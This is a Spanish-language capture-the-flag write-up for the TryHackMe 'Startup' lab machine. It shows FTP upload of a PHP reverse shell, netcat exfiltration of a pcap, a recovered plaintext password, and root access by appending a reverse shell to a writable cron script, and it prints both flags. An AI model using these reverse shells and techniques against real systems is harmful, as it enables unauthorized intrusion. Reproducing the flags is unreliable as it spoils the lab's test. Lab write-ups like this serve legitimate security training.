@@ -1,0 +1,171 @@
+---
+title: "WriteUp - Startup"
+description: "Resolución de la máquina Startup de TryHackMe: enumeración FTP anónima, subida de una reverse shell en PHP, análisis forense de tráfico con Wireshark para recuperar credenciales, y escalada de privilegios explotando un script con permisos de escritura."
+date: "2026-05-20"
+tags: ["tryhackme", "ftp", "reverse-shell", "wireshark", "privilege-escalation", "easy"]
+---
+
+Esta máquina de TryHackMe nos da una frase introductoria: **"Abusar de vulnerabilidades tradicionales por medios no tradicionales."**
+
+## Reconocimiento
+
+Como siempre, empezamos con un escaneo de puertos con Nmap:
+
+```shell
+nmap -n -sV -sC -p- 10.65.129.217
+```
+
+![Resultado del escaneo Nmap mostrando los puertos abiertos](/writeups/tryhackme/startup/image.png)
+
+Nmap detectó 3 puertos abiertos: **21 (FTP)**, **22 (SSH)** y **80 (HTTP)**. El script NSE también nos indica que el directorio FTP es escribible y que el inicio de sesión anónimo está habilitado.
+
+## Enumeración
+
+Realizamos una enumeración de directorios y archivos en el host de destino con Gobuster:
+
+```shell
+gobuster dir --url http://10.65.129.217/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+```
+
+![Resultado de Gobuster enumerando directorios web](/writeups/tryhackme/startup/image%201.png)
+
+Lo único que destaca en esta enumeración fue **"/files"**. Vamos a echar un vistazo.
+
+Ingresamos a `/files`:
+
+![Listado de archivos en el directorio /files](/writeups/tryhackme/startup/image%202.png)
+
+Resulta que el directorio FTP está vacío, pero aún podemos escribir en él — hay que tenerlo en cuenta.
+
+Al mirar `notice.txt` obtenemos el siguiente resultado: *"Quienquiera que esté dejando estos malditos memes de Among Us aquí, NO TIENE GRACIA. ¡La gente que descargue documentos de nuestro sitio web pensará que somos una broma! Ahora no sé quién es, pero Maya se ve bastante sospechosa."*
+
+![Contenido del archivo notice.txt](/writeups/tryhackme/startup/image%203.png)
+
+Algo interesante pero no relevante. Ahora revisemos el archivo `important.jpg`:
+
+![Contenido del archivo important.jpg](/writeups/tryhackme/startup/image%204.png)
+
+Revisamos también la página web:
+
+![Vista de la página web principal](/writeups/tryhackme/startup/image%205.png)
+
+## Explotación
+
+Ingresamos mediante FTP con el acceso anónimo:
+
+```shell
+ftp 10.65.129.217
+```
+
+![Inicio de sesión FTP anónimo y listado de archivos](/writeups/tryhackme/startup/image%206.png)
+
+Podemos ver los mismos archivos que en la página. Nos movemos al directorio **"ftp"** y notamos que está vacío. Subimos a este directorio una reverse shell en PHP:
+
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.237.15/4444 0>&1'"); ?>
+```
+
+![Subida de la reverse shell en PHP vía FTP](/writeups/tryhackme/startup/image%207.png)
+
+Verificamos que el archivo esté en el directorio `/ftp` cuando se accede desde el navegador:
+
+![Verificación del archivo subido accediendo por el navegador](/writeups/tryhackme/startup/image%208.png)
+
+Abrimos un oyente con Netcat y accedemos al archivo que subimos para obtener la reverse shell:
+
+```shell
+nc -lvnp 4444
+```
+
+![Netcat recibiendo la conexión de la reverse shell](/writeups/tryhackme/startup/image%209.png)
+
+Luego de investigar los directorios, encontramos un archivo llamado `recipe.txt` que contiene la primera flag:
+
+![Contenido del archivo recipe.txt](/writeups/tryhackme/startup/image%2010.png)
+
+![Detalle adicional del hallazgo en recipe.txt](/writeups/tryhackme/startup/image%2011.png)
+
+La primera flag es **`love`**.
+
+![Valor de la primera flag](/writeups/tryhackme/startup/image%2012.png)
+
+Después de buscar un poco más, vemos que solo hay un usuario en el directorio principal llamado **"lennie"**.
+
+![Listado del directorio principal mostrando al usuario lennie](/writeups/tryhackme/startup/image%2013.png)
+
+## Post-explotación: análisis forense con Wireshark
+
+Al intentar ingresar al home de lennie no fue posible. Investigando todos los directorios, encontramos un archivo llamado **"suspicious.pcapng"** en el directorio **"incidentes"**. Para poder leerlo, debemos transferirlo a nuestra máquina local.
+
+En nuestra máquina atacante (Kali) ejecutamos:
+
+```shell
+nc -lvnp 4444 > suspicious.pcapng
+```
+
+Esto deja a Kali escuchando en el puerto 4444 y redirige todo lo que reciba hacia un archivo local llamado `suspicious.pcapng`.
+
+Luego, en la máquina víctima ejecutamos:
+
+```shell
+nc 192.168.237.15 4444 < suspicious.pcapng
+```
+
+Con esto, la víctima envía el contenido del archivo a través de la conexión TCP hacia nuestra máquina, permitiendo su transferencia directa sin necesidad de SSH o autenticación.
+
+Analizamos el archivo en Wireshark y notamos varios intentos de conexión al puerto 4444 desde una dirección IP. Usamos la opción **TCP Stream**: clic derecho sobre alguna de las peticiones realizadas a ese puerto → **Follow → TCP Stream**.
+
+Esto nos permite reconstruir:
+
+- Chats
+- Credenciales
+- Archivos
+- Requests HTTP completos
+
+> Shortcut mental: si vemos algo interesante → Follow Stream.
+
+![Reconstrucción del stream TCP en Wireshark](/writeups/tryhackme/startup/image%2014.png)
+
+Con esto encontramos la contraseña de **"lennie"**: `c4ntg3t3n0ughsp1c3`
+
+Tan pronto ingresamos y listamos los directorios, encontramos la segunda flag:
+
+![Listado de directorios tras iniciar sesión como lennie](/writeups/tryhackme/startup/image%2015.png)
+
+![Segunda flag encontrada](/writeups/tryhackme/startup/image%2016.png)
+
+**FLAG User** = `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`
+
+## Escalada de privilegios
+
+Ahora debemos conseguir la bandera raíz. Encontramos `planner.sh`, `startup_list.txt` y `/etc/print.sh`.
+
+![Archivos encontrados: planner.sh, startup_list.txt y /etc/print.sh](/writeups/tryhackme/startup/image%2017.png)
+
+No podemos modificar `planner.sh`, pero sí `/etc/print.sh`. Ejecutamos el siguiente comando:
+
+```shell
+echo "bash -i >& /dev/tcp/192.168.237.15/4444 0>&1" >> /etc/print.sh
+```
+
+Abrimos un oyente en la máquina atacante y en un minuto recibimos la conexión:
+
+```shell
+nc -lvnp 4444
+```
+
+![Netcat recibiendo la shell con privilegios root](/writeups/tryhackme/startup/image%2018.png)
+
+Y así obtenemos la bandera root:
+
+**FLAG Root** = `THM{f963aaa6a430f210222158ae15c3d76d}`
+
+![Confirmación de la flag root en la terminal](/writeups/tryhackme/startup/image%2019.png)
+
+![Vista adicional de la confirmación](/writeups/tryhackme/startup/image%2020.png)
+
+![Vista final de la máquina comprometida](/writeups/tryhackme/startup/image%2021.png)
+
+## Conclusión
+
+Esta máquina combina varios conceptos clásicos: enumeración de servicios mal configurados (FTP anónimo escribible), explotación mediante subida de una web shell, análisis forense de tráfico de red para recuperar credenciales en texto plano, y escalada de privilegios abusando de permisos de escritura sobre un script ejecutado por un proceso con más privilegios.
